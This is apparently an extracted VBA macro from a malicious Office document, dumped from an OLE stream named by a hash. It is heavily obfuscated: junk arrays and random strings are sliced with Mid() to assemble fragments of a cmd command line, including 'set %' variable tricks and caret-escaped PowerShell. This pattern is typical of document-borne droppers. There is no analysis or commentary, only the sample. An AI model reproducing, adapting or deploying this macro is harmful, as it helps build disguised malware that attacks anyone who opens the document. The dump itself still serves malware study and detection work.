Filename     : ./macros/f8d9ffc5ec38f6f0f367fcc41184d32ab4b5e8a988958b38c9197ceb1b5a4f6e
OLE stream   : Macros/VBA/OLCnzEurz
VBA filename : OLCnzEurz.bas
----------------------------------------
Attribute VB_Name = "OLCnzEurz"
Function KMuZRpKPw()
qDQHpBj = "ikDPXHGSbtMhHVzAFptGLfibzdSiwnrRBFKUFJuZEcJlJpQXzlpBjKaNwGAZGNWoBvfBKfuwvTBjVzSINCo94Y1Zc43oS4C"
bJCWkTK = Array("PUvijPNR", "kPTQoMhi", "AfsHbtFK", "GXQYBEEv", "EUzwSBnF", "tVzcviCD", "zTGzDMhW", "OkXJwoPf")
Pjizp = Mid(qDQHpBj, 8, 74)
zkTvHhJkpfi = Array("JqfzmcIi", "XrQUfuvR", "UwwKoSaz", "vjzMOObw", "ZBNjECLh", "qYdNSNjU", "UHmirOuq", "QfBGcvTJ")
iwblmbScQwR = "PzhGbbCAphjzjYZRqDwGlNOflNVwGTpHPHCBiBfJnfjh82wqb1uTjAm6iCkPmGYcrKXNn91w1PoTmw"
jFHKFO = Array("zKCIsAkH", "UjwnHqVt", "LlXdQLwD", "TXbzzjad", "NrDrouMa", "mcjmnlEa", "HBkRlKFm", "LwpUZnIn")
LsZrEJt = Mid(iwblmbScQwR, 2, 42)
jMMcoOIw = Array("jHAfKsIn", "XMfqAbsL", "CwMjoUrX", "kOqzzBOU", "osjraucd", "mBNBCqDF", "bWkDWkZL", "QdvvCJnW")
CFWwzhWs = "WWi3NGbwHUNuiXBWrAIvGfOwOrnkuNiNrmcuEjIqkWSuwhVqCcHjIYzDDkYNjaWvbADsvGRIsRLjNUCjWziSFL0fkIniq2n38c9ACiFi84BibEVc"
UXtQR = Array("jTVDKKXc", "OVLSRRzq", "wTFEBPat", "XYjnARiG", "HPDpsiOa", "knCmDXCZ", "KmCkZMuR", "tcflbjbz")
PkGhWcZhinD = Mid(CFWwzhWs, 11, 75)
cSdkDVKXT = Array("vsTjhvVd", "NMBdQDlU", "GjHzqcBJ", "EjsqMRfh", "HNsazdSm", "mYLkJOhY", "kIPQHOpT", "qKcADfRw")
MUdOPi = "2FYLmsBhHPQWtkKKbUIKfrYOjhkVHUrzDKNJkJJWWrZXKJhLAPQQrLqaqFcFIjamXTSiXBaSKlnnRAEZzYUrEbFrTmSijDOqRmArrwowozGFYDIqADFjLiiwNbOkjvlGWwWfANiBkVCGUzTQibidwfiiDDdPjDPtMzjbjdqnVEzqfbbNHzCT0nfa"
zdCvr = Array("qQQQYYKk", "ZjdTNSJT", "rrfaqQGP", "mOFYLpiw", "qHnYmELr", "iKzSVwmE", "vSkYMcVa", "KBdKTmYk")
FKbwoKORwH = Mid(MUdOPi, 4, 174)
qhnIJ = Array("jRCHoroW", "zcYfSmAo", "hqiUMhvz", "WMbvTkmI", "OCNbdwRu", "qtUdoCUk", "PsuWCzPz", "WFlcPsCM")
QljsOjWd = "HRifLRYkw3qMkOFoJCisCHdukXYDTAEaHpkEHHDZEjwOs"
woqZhdi = Array("iUTzHoCE", "uWXjOshH", "cRPnvGTO", "BwcDdjzv", "CXODGmXw", "WHlwAjvS", "IQjoEwXX", "AEzKLwbK")
ulYsMwjzKS = Mid(QljsOjWd, 11, 29)
ljwvOOz = Array("QwvFaDXv", "bRIFNOcw", "FqcnSFlF", "hOwCLHno", "mOHotBwF", "QmqsXZlf", "nYLjUYMK", "LqYMGUkT")
MaGcjb = "5X2GMlBFDFpaNzffhPAszadzkcvDlAdjiabYuiidVOaiqkWtwCSQRSBUuFJuUfjdsOcnVGlwlXWjzwJzGBFjhMOPZHioZjHnsvEHm4qhBbPdUrS00"
WlNpCRc = Array("LiQCvoph", "mIGqFiwN", "QHimBzdD", "kOKldDBQ", "dJdolulK", "kRRfhmow", "rQRtLwUL", "ANRjdEEj")
bcoroz = Mid(MaGcjb, 13, 82)
uKOcLJbhJ = Array("itHuuoTw", "WPvHPDZQ", "oXKNDkTR", "QNodNADR", "rNIlbHkC", "HMfoSCzh", "wawEnnct", "aqihAqjW")
lrbhlDFlP = "iOPtdtSvMVGjwSOwCHmGTIjZhAshSomTIcnjFrGlMWjvjWiIDzaQQzKUocPwjGzFAhaWiiqLBAuwblqKWjiVNWDLRTudbJntwWSwkWoTK9uE"
oXOqEL = Array("BmmcGNsK", "JRTaVWBf", "JjuhTZNY", "pmXKQatH", "ZswhTnRi", "KkcGMrwi", "AismpQlc", "YOmUqhti")
BShBjwsDrvt = Mid(lrbhlDFlP, 12, 83)
QFPEwQMuc = Array("mWXzadai", "RMXqjMlE", "olfLwSVV", "lYHqkNKl", "EHGYMicO", "rYzwUGPY", "vCulXjST", "BBNBVkwE")
zjicdjLQit = "83bwKjwXMkPEXzXiDzPJi8Lw3b2mkzfQcBsEiDAlvjrdhAjSKwuXFtXPjUdVvKmirG"
UKzNiAbolPz = Array("FwIljPvL", "BNaDmMfB", "lzYlhGMr", "wjMvSkii", "vSoCitZM", "TGPqjzma", "jIWHhjIw", "kRpwCAsQ")
XkGFpCS = Mid(zjicdjLQit, 33, 30)
kiWhsTpc = Array("UtsCYMFS", "odMKlpPF", "osDKRuGi", "sREAAwXP", "BzIAJdrp", "jNItzqfF", "bPRQDKDZ", "nOKHHFRq")
mSwIF = "9650OdvbdJSqlrUJilCUOFFtWsZkYWXioYpSGjzBpmsnndDQuwTQjhREhlKVELDHmkBNBCDClAfbMSFtoIpZCGBHHlkUWizdjlADbqOsvRijBprPfRjvWdEfitGQRifHDBsbSCoDIQCSDtZjd0NNs"
pvHLZ = Array("JirJIjGT", "zQXGOvRa", "tOGZRppP", "NKwoRwIi", "AMYjdDPI", "chHhEOtX", "PWLSwwAU", "sbvwnSCA")
vLcDUq = Mid(mSwIF, 5, 130)
AwUot = Array("CwMsKUEi", "lFUisbAb", "iDFLctif", "vGnzISwm", "rjSQVODp", "oViiOUMY", "siAHzbVI", "ThzEhFVS")
dEmiCrEp = "E5KlpfiTOo2Bm0GnokAQHqMimCqDlzRBKzcTsBvtMCmHKGTjGBwckdztZFGYjdkHNnmJUGLDCGEFDEXfiGzjhjHa4fap"
bZjcjzrAhr = Array("OpjlLskE", "ASGYQQlz", "LqIFjjWP", "kDpifakT", "mBkwNKJE", "LwuqPbEG", "vhPtdRJi", "SRAIDFZa")
OXGsmkQbb = Mid(dEmiCrEp, 19, 66)
joMqltKwKF = Array("cnFaivqY", "XuUTWjEv", "RCmLiHQX", "tHLFAiff", "mlYMLMBU", "FJqzmtvU", "zvBvIWAV", "WhhbklXp")
wtVrSlqPow = "WcACLVPfWNiLLIY5VWqWTG4fv4XfKGKBEvzrBmtVWhifzWLFNKzLIfYBrZkBQndiuDmUbfKRtzjidlfMmhSAJztYWwAsO3vzpY"
ohnaWzqEB = Array("iAYAuOGv", "civqUlXk", "EBDOpcqB", "oAavDHEd", "JCRYvMkG", "wOqibzBV", "tfCordTB", "JXLtoKsV")
SGwSbipF = Mid(wtVrSlqPow, 28, 64)
cliBzwI = Array("CpMVYWTJ", "JbDwfRwS", "QrdTrjhv", "EQjYSzwD", "YiXiMUOu", "YALwYTMi", "UEKTNXpW", "HRQHqurJ")
BvHINZ = "54HKithllJNFGUfGtFRjwviaJcGtKAwUUSwhYDWzAZtqUXjdBACdCzfhGjBCnoalKsknXwhqiUjXCsGlscsKzVRVmPbrBUKMzHfbnwFCSMuiSIiOaPJLwPnoaOAIXpoOKUYuMfwwWpslTpkKK7czisnRwX"
bojthj = Array("zHazciDB", "dtiTCiOf", "ToiEpojE", "SRnjjNus", "KYCfzVMz", "qErwjJvS", "ojFzXNRI", "YWfLvURP")
EEjRfi = Mid(BvHINZ, 3, 138)
hnCbUEX = Array("fcFRLQXQ", "DHhttrTq", "zQadwifB", "DmcQwvJZ", "SwOkmwmh", "wdjAnYTo", "htFUqOdz", "zDOYnGSH")
kGCmoUTc = "48ZAF9cW3TLGCrbPHOHzcoSLGEWOwizSIcQXJzUjzGwQHKDlsBOiwWhzrqmYuoaQttzaaDGJuXzVrCEvAlWuQTVmuRfSLvpIjfXONdKovEjYWLHplqYJSfAZXKfJXnzwiqpMiqiWahwLjwQjJqhVXfqAizqCwBQIHkqfVvKvHBikjppauwL0"
RdVkz = Array("KFAbYtus", "XzEcjKCO", "NtizKXNM", "jGIBoChw", "ZcbMGENS", "BGijjnVm", "bmhBnKJm", "snvRlsDU")
rdnfLhh = Mid(kGCmoUTc, 11, 168)
jKjElYlLCOv = Array("fszVoZHE", "dozAXjzb", "iVZTLdvU", "UtipuJiu", "AvIFjpzb", "OjwlSGjl", "LvwGhoPB", "wiAuuRJT")
qlIwjPUvnY = "ARnfM206Mdr7wbjCikMRlKwPjUqAYvwfdYfXwkjCvRNoGXBNrMWXKYCELEoaViaAZJPMwLDtBKWUzKJMTdJLZZVEVbMuwJjQqMOzHpRfIdWzBhHBvbGrVObAoKqUzJwsWGukGdi7hQ"
iUzbHLtmrw = Array("YjYYkjMT", "EzOEVNXL", "HMOKFCFj", "SjWAKYmj", "XnEtiChD", "JkKliPrm", "iAWLvdEW", "drFAKLIf")
jEiFWn = Mid(qlIwjPUvnY, 14, 115)
ovdbIwMuT = Array("ipCaLAIU", "SpYwKhDO", "qGHHQRqA", "OhdwjJQo", "YlwWCXCK", "tLwddCaR", "jVDOisTM", "zBMdXKnJ")
zDvrwCiJi = "XtMYPqzHDfTcZWirYzZWRURcvBrSMRqtNwhMQEvdAhCzOPdluCLXzjBjmwMotmvpNaPdpWaTEvVkRSNfXGXJFSthuAZSsGkOlMmnAAvYbsTDKROUkjQnOlkujhiowIazLGwEjaiXKwhNzpWcmFhLqwzAcrHSRGcTRVsDTJoKCscQDWvq8cdvwmwGNTN8T2DV3K80d"
JfaBahHN = Array("jQZOkrKl", "qMLAwpTJ", "FRZKfdiw", "ISjXFOpH", "wRjsSYFd", "olRjBYBD", "wCviAOXF", "mdFRLnfc")
znhJTm = Mid(zDvrwCiJi, 11, 166)
LdioG = Array("SCtNtDUj", "GVqkvCRA", "DGwtZSJc", "BsHuJDmZ", "KhSZpRPl", "hYUTJsmp", "VzXIvNYz", "tRLBwaZC")
FwONaEGZH = "IO70MlrSCUbtUOtabSiLlnFcauUNcYBiOSRjrzzEtzYhiMLtzNCNoqUmubJWnEqiSsiBzJjcSdRlPXwNiaOOVouYzfoPpcRpJtPliJwpiauKYjWWdwoMpbIiwFDSUTmqMccVIMfZiZkvtjAOIRltoEzilkncGiUKnDwvGBORQPhQfj2bZ3zuvTnmLNW4p6V8GTV2TBi"
BqfGAOk = Array("zhCBYVbN", "GUrkhZtX", "iEiJbwPk", "GkniiZpw", "lqOBEQYE", "vizaYBKJ", "QUAsfHjw", "SRunizjh")
WaFYn = Mid(FwONaEGZH, 8, 165)
jGpFiciOZQC = Array("cVoWiwOz", "fBsDtBrQ", "kPGwnkmd", "iAAEjUDK", "AscWpWIm", "GCCMjHRw", "ZWsEuQls", "jKsiwKRL")
qnJVkIsH = "kGYOJWj2i3sujKzqirizVzJUSrGVjOJONTqtGPIrsBosMMdLqLNnWNKvnaAKcAODwzhQTEjSjnEULQIGVRzbdsom"
KouIdzdv = Array("XlDTJJkF", "XLwOrSEt", "RcwVbQXb", "rNYEmEkM", "lzYfMcLZ", "iWdnNKwk", "bhNJaBAG", "ObcvlfSS")
MjDIlhAmP = Mid(qnJVkIsH, 12, 69)
IkSHK = Array("EQBktjEG", "foHrkKlV", "SGhiWQOV", "JOzjjDRV", "nQBbkNjW", "jHZvRQwU", "jOcBwMZn", "CfbilXWb")
ZfQZTszM = "8JhZTfIpJ8wmWcsV3A3oVKkzikM87tnvWKjRfuXTKPzqsZiYtqUhapdfBGYMZE"
rbiEMUobYuD = Array("dzksLIHD", "fzJTtRic", "uGUPhajz", "ajUkCvMk", "LNzNXZIL", "lcpbawwf", "jNQHrqDD", "QkSioXAj")
APBIuPwHIL = Mid(ZfQZTszM, 30, 30)
joMZV = Array("hsAbXnzN", "wZDTihZC", "wmXEksvp", "kMZnINvF", "jqWRutHa", "vRwdKHRT", "TsfVYjQp", "zKqLNLFk")
KrRrKrbz = "uwQXiDXLoPIjjhLcwZjiYEUwPYYjnajawLarkzVWRPTOLuEGcTz9pjfSpMzjSFMsnQKvfT1Ol"
XzhMKEp = Array("wrCEPMqp", "nmSGzQlj", "czYnzHzl", "GjZKMumN", "GnjnSiGQ", "SDzEdiPG", "ZvZBOimp", "tQwinfct")
nbMTHJtIkc = Mid(KrRrKrbz, 2, 42)
kEiosKrrCt = Array("mQciOXoS", "bpjjvKIM", "dkbSiXuQ", "BMVCwqsp", "hqvvWowo", "AcYdiVjV", "dIskrvkO", "WLcCBmWk")
LfSWNvu = "ZB5Zuu62wXCl8IfocCJAobikFdaRtdXCEicVCwwYnRunBp5zHh"
ZwjQwLpUdb = Array("lOhpRiiq", "iTmDmFmz", "CJkoBOBE", "YHlVvNKa", "hFzOwwui", "VnbzUKhl", "ScvGLhQX", "MdRJwMvU")
uVzJIj = Mid(LfSWNvu, 18, 28)
uuGzb = Array("ijTHojwN", "wJjsctLH", "NusKHJrO", "fpUBsfXU", "LmcdZXMZ", "XDWlcjmL", "QDdJTGOU", "rEbwPwVR")
tAURwdJUp = "6mTjLJidikcN6uzvswiBpQjzitooIC9VBz"
vikKObUUc = Array("kuOAKjGp", "qJwrLwcf", "tUjATstP", "jTuYcaDZ", "rMQrLrjD", "AtptBlOM", "fvjuVSzr", "AwQqmiNP")
lmrqp = Mid(tAURwdJUp, 20, 6)
FDKbfdzoli = Array("PJWjLbYZ", "TIqcNFlm", "tqcbBpzO", "FlMTHDYw", "OMuFfDAS", "iJdAmZsr", "jGjfDwca", "KHbZOFSQ")
UPNKKiORt = "IidWFGXbuBwHiYGOPPDNtDlEawbdriiPEKjNjrvnYAqoOOFFPzGoHEarrXjIiujPXjDTptiXTPotNwpLrWOsXqHAksVMHnIiRaRiLlQWUiUrPjiuhXRIfqrhYCizXRPjGKbmfHAFFsXpVQlDNafkVAzaikJIDTwCSolFErPZjpwWzr9fSmZmDD9L3zrB8C6"
vttoEW = Array("zmKuoUNb", "DbFJKnXw", "tEpnAwop", "OXiikNbA", "jWtovARz", "duwDKjrQ", "YbfUOXiw", "wUjQmfrq")
ZFvpTE = Mid(UPNKKiORt, 5, 164)
nlRhsfLw = Array("PjtdNjNq", "CwFPCOGr", "lqcJEMdw", "EoKJfXBT", "FIZldJmA", "EuBqbFvF", "UrWCfPtC", "DvZZZDLf")
DjSkMDXFj = "7JrJicRajuNtaoRwtwdlcVFRtVoFzBHFhUVikwbNlXcAzPzdAhCaASDMnoWvtaJCunuzjiOvUQzEsFUiYLFPzjFORIuvbjTLNaGJVAwRTGGjTwTiTsWiUuDNhffYnSUnwnqSwKIYOnwsaVvSoMbiJlqTXtcpUXdAlSmfHBjJkzThzKmLkMkaqldLwXvFiSEqJvGIjPKndSwMRJVMGQEHnYNvLGTAJPi"
iFQScRS = Array("WnhdPvwp", "vWmGUdXn", "phjiUhGI", "YPVpPIcG", "nAdKfqqU", "jNUUSPNE", "JEiEtrDp", "jYFzZGan")
fZqcBZ = Mid(DjSkMDXFj, 15, 199)
nlnBwfS = Array("bLCrhZVc", "vUkvYMwT", "wclSPtdV", "AJnvHXzw", "OvzCWGjP", "jIYAzMUF", "PcCPqFWi", "hjrXmZVY")
MCzpiXciuHD = "7ZPBSXGJlMXIfwVoYKALXqztJPmHFsYGVhjDQYWANBdnSkuhDFSKhPRmhIwIkwEtnRnwPRYzoAzWNKaYVEEAaOZFPuVIbNPPzjzAzvSlhTVhRvYXhYnjtDTYrhjVwQXbkhZdUqOzYivbA7SSvrojVK"
iIhEVf = Array("XTSzQhYR", "ArFIrJWz", "uiDwvNRA", "Hkwijcww", "zaShENWn", "wjwmRznO", "aOLzkqZK", "CRqfltiY")
MkumvL = Mid(MCzpiXciuHD, 6, 127)
JzMzJzwqTA = Array("RYUjLCMK", "NkOpKjCA", "MjXpumzX", "UFUYVtNu", "XMPVbvij", "kmupBWKm", "VWwzdWFf", "YzLGiooU")
RadGVdpsSbT = "QrXLDnSCLIRijzmmZ4hwlJzYl10u904wYz1tcoPQA1auHdLRz"
jtzrqHUwB = Array("qjUrhXwD", "TAjAFrYw", "PBwkQZRz", "FuMQnCoV", "qWhdAsbP", "aTjwpLIp", "FWVQrjGQ", "RWlmKjQR")
VlfLmnvDEH = Mid(RadGVdpsSbT, 3, 13)
WTsNH = Array("MvQnkbXa", "KSzmKpRr", "MHGpIzOl", "SzJiIncQ", "SSIuuInG", "JItXNUkI", "mXXCwVMN", "hiUlRoRW")
uKmkSAIbGJ = "LtLT1wkufAIpdXmJFzFToYrUKuJJAWSwicuvKwoqMNqjisrjsDpdvjDXPwzzHCiqBFBtCmHGJPGaiHlSDaQzhoAvZWjOBriKizhcqzjGwiUjccpLI"
jFDVtzI = Array("WoAdkiso", "uiPBUBwc", "sjlujIwf", "GWQYJmCH", "itARDcfj", "TOaanwrp", "tQnBGNTN", "qVXOOTfH")
dPtlE = Mid(uKmkSAIbGJ, 18, 94)
wwrPQ = Array("cPuYfisN", "qzshhSmH", "qNPOoRYD", "jwwAGndD", "hEhHOBTk", "zmzWGDGP", "OLDUFCzL", "rqsjisHD")
jLqjnhEzGct = "oOkovniuT3zoXQhCXntIKabZlSSHtsoUVzaDZiVtQbJQMzpRvuwjVvNHwNublMfzsPzwpTBBMjNjQLNocALwwEwakTHLouHEvJXwwrccsuXphiqkAGwkBjDnQYOVLpNSYJnGoQqlYjFBhJsFdXLhvXDOGjjZdGQChFQYqjwjPNLRbBGGfIsoifWBFZzEjQISio"
ZcrjjYWSunA = Array("FBOkYTOn", "PpNMhkMc", "wMurSQOs", "MauZOraN", "XpUjTqnG", "KTiwGqPj", "baFdVGso", "mVYzZpZX")
tPFUf = Mid(jLqjnhEzGct, 21, 172)
LHjvfRJcO = Array("jblOYMkN", "mQBaAwib", "GJFrhiKz", "KXXUQaKA", "MPYLNStQ", "dVAZkhaL", "aZHulTCz", "RoDBpPzL")
smasjJW = "Pq0PKQJqijbcJiFdkvLEdMdDvCVDnULwUCouclOJzwwjwjdVwEWFjWdfsKfzSHDAoKbqpKBzhCHfPwFPZzGjzFPwZICRFQqqvvsnFnjlDXYjPzQvFQYTATDivdQjIjtRMQkTERJlTVjahjibsHMprXqbsJsbWzdTdGTwMwqoGnzimcBLupnAXEZpaIbuYiOTrMwaPjOIajM2b4"
piiGtA = Array("jSdZidOF", "uLiCJkwX", "tAzjVQHm", "nqjuNPVt", "prMuTwPB", "dDHmqibw", "zmZhpbzP", "LrlrwTri")
Wupqs = Mid(smasjJW, 14, 186)
AQstfKGhmW = Array("GLEfkjTm", "wzXntKrD", "cdOQCVdJ", "VRwfcdSE", "KUbOoXjD", "hAMsNzXz", "fsIBzYhk", "huJThoKV")
ndWDY = "IwGHRIIqSobwjSRjGJtVQrkBlqHtjoCbcQIlzIbEqsJsBuEDnSjWhFzPNFWbAOKdlzUTJfiwipiXiszrmDGNEjuWTsXsmzDchfGBaktHklnsbZjVFiowIzZEFzZTto1FdDQ9MNkYjQDJjzBa9k5lL3HfYvFYL"
RalPuCYv = Array("YmPGPUhS", "chwbpQXJ", "hsLQMDMw", "TvOQfkVL", "vozkOFIl", "kSwMBoMs", "nkzmNHBU", "aTmTFQnr")
HJmhzWKfMaT = Mid(ndWDY, 2, 121)
VorKnp = Array("twGhZurG", "LBtLqNtJ", "rthjwrmu", "ntQRiwcG", "vkzYbYQA", "lUCVXdMX", "GRkZuzQB", "JLtjiZYO")

niMIhXd = "IrH2tbq28zkf4RwwoizmMiLi"
AUWZORnwJ = Array("YjQGjzYh", "LPlECiti", "XSmzojpn", "EakXTjkR", "AotVuYzK", "UIjDXDVP", "oditIVRs", "ucCIOAOi")
Nshim = Mid(niMIhXd, 2, 1)
UwPuzl = Array("TrfwHNrN", "kwsMSidd", "JzMwavww", "oBBwsfaI", "vMwiFbmw", "NVtREKii", "JsquTIHX", "uhHFLvUF")
SaCViBGzL = "waOlUr8zGrorakwaTYa2c           ROwIckk"
XOvbbqjRj = Array("BWGUfLjC", "XIUjwGzF", "POtLQnPw", "ISWnjSfa", "aGvDLBBW", "VaHDoIiB", "QOMEjUjO", "HIMMowTF")
OKovKOzO = Mid(SaCViBGzL, 22, 11)
duYUVaucOi = Array("hLksNMBw", "qTzORdpl", "GSGUnBDX", "XlubRuSa", "HzwiBDuw", "AGDzaSVj", "hFdfLIpj", "HNUcSZfw")
bhnhW = "mDoOzmADNREbGSll&&set %3MYXDTbwz7v7"
ubYrrzdYK = Array("ZTjQOPbt", "pYNdZdGK", "Icjqjfua", "GvwjcCJU", "NYzjHCBH", "GmGMjjAl", "URBvNiju", "ZJJTQuRn")
EukVph = Mid(bhnhW, 14, 10)
CWwQkwNPt = Array("oQiijQzt", "dAwHjkcj", "zBFcLOBH", "CatDYMai", "YTVNIELh", "PipXArSQ", "WhjvkzMZ", "PbcJXuVQ")
IAZOmlJilWo = "ac7rcFRSfMG%!   tMiNIMQYI0Js4aCGoCGvhAu"
vsVAfD = Array("nlWRNUiT", "GMWjpKEz", "pnzcjZlb", "sJYHoVaU", "XTiZMpEW", "iazMlDGl", "FcwFRiuO", "zuZEvafk")
PfQuHhzMYK = Mid(IAZOmlJilWo, 4, 13)
lYvPI = Array("iYYGjzCu", "HQvEtTpz", "iOfFJmcO", "jzGnoddK", "ibFVROIT", "jdwSKiHS", "qMuDYHjw", "wJamtOGd")
VpiSo = "H         Do4wPEFTJmocF"
HFjWLwIih = Array("EzRLYYQI", "ZNsSsjbU", "pBYaFRPH", "EGXjJjfV", "zitBPIMf", "ucfuLRqj", "LsCRsHmn", "iKGRBjwp")
bljFrUhVt = Mid(VpiSo, 2, 9)
TQuhcvFwE = Array("AtOPzFvT", "haUdwNLn", "izMjzSia", "CImdlqWX", "LnpmWWaz", "nhawzhTk", "EKkEHDji", "PnMrTRir")
KcWBNt = "iwlmnICt2jWArjLS"
BTFGrJlJpj = Array("InVFsGdv", "AkCcwjsl", "OiMrldhs", "fnwHusuO", "zsMQabYE", "zizXvYAd", "JbwiFZrf", "GdZEKVAH")
LDoRrUwcbjR = Mid(KcWBNt, 11, 4)
rHpFzWC = Array("OSzuHHoj", "rncLmdQn", "DGrhtRFw", "huuXSPip", "qhlJJHFG", "fRVVEwjQ", "LaiAHzBz", "MCMMMRRc")
rmBijVDqMA = "PJwwcsv6PlKTL1%zSiOftr8Q"
unjNoQq = Array("wAItcipQ", "vWbcYuXz", "IJmBHNDX", "HXzCItjr", "iiJdWBqZ", "DtHcbGmU", "vHRCdvol", "zllFkmHB")
IjGNz = Mid(rmBijVDqMA, 15, 6)
SinRMPFj = Array("OSUlcoKq", "MPDijLuK", "jOPjDCDB", "iCcutQQC", "ZqjMVPTs", "HaiIifuT", "HsJCwCiL", "PSHZMQwv")
sWlBkz = "3YtDset %zDAzZtw3mBNFI8pCzV0IWf7dO"
MBduIGLck = Array("RkwoHVXO", "aKnkVIzX", "HwPYEhpF", "pASAKUBs", "tqKwJdRI", "EEfmYiVo", "zzFnjORj", "vtzGCWDF")
HICvOZMrL = Mid(sWlBkz, 5, 7)
iLqzKBVLTW = Array("YhcAoEsn", "tEWRtzlU", "tIvfRikj", "faUtAXnm", "SEqQzfik", "rjMbiISY", "dbSFwMPq", "zwUNjznW")
issnGa = "QtDhBjS8RdkuEaHGjabQQ%=hOqoFB3kzk3ZHLn"
oOiSZK = Array("vqMREcqp", "swZsAqzh", "rjzmoTvR", "BKhcMavR", "mLaVqYBA", "IntvltQk", "pLAdBQib", "uuPuuNdS")
wIZHEQIwd = Mid(issnGa, 12, 14)
UoWXKK = Array("AmzcZDYn", "pAdnFjkH", "uKEphjLL", "jhqZkREn", "bobIRESI", "QpiVLCqG", "cwdlrKmR", "aossNwCX")
fnaLYntSoK = "wb1UsXCIaNuL&&s EH1DhwBzaidfKzwAjG2IzvN"
TTHuHas = Array("SGUCzjDu", "rUOXqWkh", "wCDwimLO", "AjlilutU", "frfqjKkQ", "PZftuwqt", "YiwPPHsj", "uGCQzUJw")
cjwCDDJ = Mid(fnaLYntSoK, 6, 10)
cBiIh = Array("qkqzFCVS", "dbjrWKku", "zjjBGJUh", "iKkCOCIZ", "XUNBrCpL", "miSwwAMh", "zSUWOJUh", "PJQuSSDa")
TXHKS = "DMMYw4MGXahwmAqi%=KujikK6aDKPmvHdn"
MlDZtMAW = Array("wPLjUJYY", "tTIPwCVa", "CwNHuDPH", "uBkFMuKm", "XnhWwkrN", "MsjVNqJB", "POdKAzjv", "AEmTZSMz")
AolDAEBnA = Mid(TXHKS, 14, 11)
KURZtDnBtRJ = Array("UmtYATwz", "ofVpjczP", "ZUmJsNiI", "kUKksLjF", "dzInqAaT", "AdQjmJRM", "XkRdpWFG", "DkojINFd")
LDbLwBwzkmz = "a3kjDm4qN8zZlaTB6jz5 XMNEM43urzmvHWGF%=p&XtdKF0oH"
UAoDZO = Array("nIMavWJV", "qanMLRRV", "uLmKbaFo", "kdRKGwRE", "miMsSjCX", "ZBWXQYAS", "kOfjmmdN", "CXqRFzOr")
CQNjtpSqdL = Mid(LDbLwBwzkmz, 29, 13)
rVquIcFmzYD = Array("KBVkjBFr", "CaMEwlXW", "LQjQwwSS", "AFJjuwmE", "sVqAMqZJ", "cknAAiKz", "ujWMwDlM", "jCkasYzE")
jLLRzwSa = "Eq&!%urzmvHCGiaOki7RljVtrrj4rfH2jClBmmA23l"
cZGzoUqsQ = Array("mjuPUJlE", "UoANsmci", "dswdpNnB", "VqctQWdZ", "cpaIfwCS", "kMtYBPsa", "upAktcoY", "sttdjsnw")
ZrwBNIi = Mid(jLLRzwSa, 3, 9)
KVwajsEo = Array("wLnZTsOF", "lOhwNuwB", "oVvPwMwQ", "FpPXzHbB", "DwapPkAG", "PiUMoaLW", "bWRONBck", "MWUicqFi")
zPBHEh = "RKQsaVsoYLiQ%=owe^r^iHZvjfiJ68"
aamrRj = Array("CFLWpmhR", "JYEYRbiq", "iBdaqCLc", "FqbPZWci", "AHUXPvqi", "jwJuIzRd", "JPbrCvsz", "tjRwLRrn")
ZMJtpjMA = Mid(zPBHEh, 9, 12)
uJKfv = Array("qCEYBYbJ", "nXkBzPSo", "zltQtHzL", "SvjvnEVi", "pcZjHfbU", "LVqWcbRf", "RNNTTNXi", "EsGFsjVj")
EwmurI = "JUPaSqRZI3vjZJzwdYLi0oSvYWdBZ1aa"
bSfjVXYM = Array("sdPszjJf", "qknHTBLn", "iJrjMkMA", "KAuppfiI", "GzJiaNbk", "UspvzuFa", "GGwrfTdI", "QOizlUqL")
jiqZW = Mid(EwmurI, 13, 8)
MwJHnSW = Array("ffpXSkiQ", "aIVCFYCR", "OBPSRGDX", "dnkHNkQs", "nMYWHiKf", "fJnCLqFa", "QdYjfmCY", "bStiAXDq")
whrSwICID = "kzbO4Jhai3et %srcFROcKzvK7rwwpYIKBBmJAmVPwhwsd"
pPPPzHi = Array("ntXbnuQq", "wRQdChZj", "fWznoYtH", "TpoUjMUC", "QksavOJm", "cMuiMGZS", "zidpvqFP", "zQIwFwHl")
BkJjMoAiUAT = Mid(whrSwICID, 11, 9)
ssUBL = Array("IPRQdjXK", "mFnIdEiJ", "nTzMXhOt", "CUTdjrRu", "kCQoszVh", "vufjUSpz", "jtCsAdjb", "AXOIMtdu")
raFmz = "Kk26YorYrrUJWZ7O0BzvGi&F7r"
PJWKVhBmA = Array("vjWcPqwY", "WjhEDDNc", "GBKnwqiz", "CWiiGLRP", "nSGEIlXE", "jzOSUUfU", "IkwFCwdF", "EXatLQSK")
KppSPXIXCum = Mid(raFmz, 21, 3)
Rwajmv = Array("iiXTYwTI", "rXPXDVsD", "qmIJdwGB", "HUpFWRbf", "AaFCESQZ", "cZsCniOn", "uiVlBBYi", "XWMEHNma")
TaSsOs = "ODOTj%=NlUrSSDrjup6107ZEfpAGC0mkBi"
QsBUjopzM = Array("lYQJfkAS", "bdCXjPsu", "aFuLGorZ", "DSEYpPiL", "FBcSwLKw", "mDZMqAlq", "sVqbHnEz", "hrFNfbcM")
mCGbvdUqfwz = Mid(TaSsOs, 6, 2)
Mzbmip = Array("MjUXLdiz", "nbFjkPuK", "YHsRctii", "Hvvbzcph", "SbkKKFjP", "OEMOqNVq", "jmWBqtXS", "FlQQhCzL")
HGIjEVRww = "mRw^he^l^l&&setsDT3VUo6z5KUmAR0j"
voYNciZ = Array("kSbrSFUN", "tWUJsiFi", "OUokhWjP", "BsAPHEEw", "FowtPWap", "TANakXqP", "EsVAvQkO", "mLpaEEFo")
XWZiLzjw = Mid(HGIjEVRww, 4, 12)
lqUwmOLNr = Array("hOcANiUZ", "LNwwauEu", "viwDQwQR", "acNjYudd", "UibzaipZ", "iHGhMrOs", "unNGzEjj", "wKakVkBR")
LSsorPYpliM = "B5lBjwnw5jkaKIUAvvMYVrfwN %lUAMAsKlNZLwXmzIcB3F"
prYEJYjQJ = Array("ffnlVulF", "pIUSIuDV", "cihrwHRc", "soNhHhqw", "iZuUKftd", "KWqjUAln", "ftauWjnY", "NLtjjEwH")
qfMXJzEkc = Mid(LSsorPYpliM, 26, 13)
JWJLcv = Array("NDmjwRKO", "ISpGzFqC", "cZXVbSVE", "UttFoYmK", "SLjvQWkO", "AJJaAwRP", "XwcfspSu", "iiPCYEak")
ijndGwmn = "zMMAQnfriPv"
sWXtib = Array("mHKzzSQp", "NFNGWKjK", "JHpjvTJu", "wtJsYrca", "irIwMlsW", "GZnILhuJ", "kqMGHKjS", "zQAEJXQV")
jHfHAqiF = Mid(ijndGwmn, 7, 1)
iskIaajYvYb = Array("HZDiRMcA", "mGidlIwZ", "ObwljqFm", "huziGKUX", "SmKdJZOq", "YcTvGWkq", "pWOAOYoR", "UQAWOzuc")
